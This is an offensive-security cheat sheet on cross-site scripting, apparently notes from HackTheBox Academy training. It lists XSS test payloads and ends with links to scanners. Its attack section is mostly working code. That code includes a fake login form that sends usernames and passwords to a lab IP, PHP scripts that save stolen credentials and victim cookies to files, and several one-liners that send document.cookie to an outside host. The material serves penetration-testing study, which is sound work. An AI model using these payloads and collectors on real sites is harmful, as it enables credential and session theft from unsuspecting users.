
## 🛡️ Cross-Site Scripting (XSS)

**Tags:** `#XSS` `#CrossSiteScripting`

XSS vulnerabilities exploit flaws in input sanitization to inject and execute JavaScript in the browser, leading to various client-side attacks.

---

### 🔍 Types of XSS

|Type|Description|
|---|---|
|**Stored (Persistent) XSS**|The most critical type. User input is stored in the backend (e.g., in a database) and later rendered in the frontend (e.g., comments, posts).|
|**Reflected XSS**|Input is reflected immediately in the response without being stored (e.g., search results, error messages).|
|**DOM-based XSS**|Input is handled entirely on the client side (e.g., via JavaScript manipulating the DOM), without reaching the backend. Often triggered via URL fragments or client-side parameters.|

---

### 🧪 XSS Payloads for Testing

- `<script>alert(window.origin)</script>` — Popup with site origin
- `<script>alert(document.cookie)</script>` — Popup with cookies
- `<script>print()</script>` — Opens print dialog
- `<img src="" onerror=alert(window.origin)>` — Triggers alert via image error
- `<img src="" onerror=alert(document.cookie)>`
- `document.write('<p>XSS test</p>');` — Injects HTML
- `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` — Changes background image
- `<script>document.body.style.background = "#141d2b"</script>` — Changes background color
- `<script>document.title = 'HackTheBox Academy'</script>` — Changes page title
- `document.getElementById("todo").innerHTML = "New Text"` — Modifies element by ID
- `document.getElementsByTagName('body')[0].innerHTML = "New Text"` — Modifies body content
- `$("#todo").html('New Text');` — jQuery-based injection
- Full DOM-based payload:

```html
  <script>
    document.getElementsByTagName('body')[0].innerHTML = `
      <center>
        <h1 style="color: white">Cyber Security Training</h1>
        <p style="color: white">
          by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
        </p>
      </center>`;
  </script>
```

- Blind XSS test:

```html
  <script src="http://10.10.14.172:8080/username"></script>
```

---

### 🎯 XSS-Based Attacks

#### 🕵️‍♂️ Login Stealing

- A fake login form and removes the original form to trick users:
```javascript
document.write('<h3>Please login to continue</h3><form action=http://10.10.16.19><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('urlform').remove();
``` 
- Harvesting
	- `sudo php -S 0.0.0.0:80` start simple php webserver (insert below into index.php)
	- Example `index.php`:
	```php 
		<?php
		if (isset($_GET['username']) && isset($_GET['password'])) {
			$file = fopen("creds.txt", "a+");
			fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
			header("Location: http://10.10.16.19/phishing/index.php");
			fclose($file);
			exit();
		}
		?>
	```
- 🍪 Cookie Stealing
	- sometimes may need to be hosted as a script file on attacker
		- `document.location='http://10.10.14.172:8080/index.php?c='+document.cookie;`
		- `new Image().src='http://10.10.14.172:8080/index.php?c='+document.cookie;`
		- `<script src="http://10.10.14.172:8080/script.js"></script>`
		- `sudo php -S 0.0.0.0:80` start simple php webserver (insert below into index.php)
		- Example `index.php`:
		```php
			<?php
			if (isset($_GET['c'])) {
			    $list = explode(";", $_GET['c']);
			    foreach ($list as $key => $value) {
			        $cookie = urldecode($value);
			        $file = fopen("cookies.txt", "a+");
			        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
			        fclose($file);
			    }
			}
			?>
		```
### Tools for XSS Testing
- [s0md3v/XSStrike: Most advanced XSS scanner.](https://github.com/s0md3v/XSStrike)
- [rajeshmajumdar/BruteXSS: BruteXSS is a tool written in python simply to find XSS vulnerabilities in web application. This tool was originally developed by Shawar Khan in CLI. I just redesigned it and made it GUI for more convienience.](https://github.com/rajeshmajumdar/BruteXSS)
- [epsylon/xsser: Cross Site "Scripter" (aka XSSer) is an automatic -framework- to detect, exploit and report XSS vulnerabilities in web-based applications.](https://github.com/epsylon/xsser)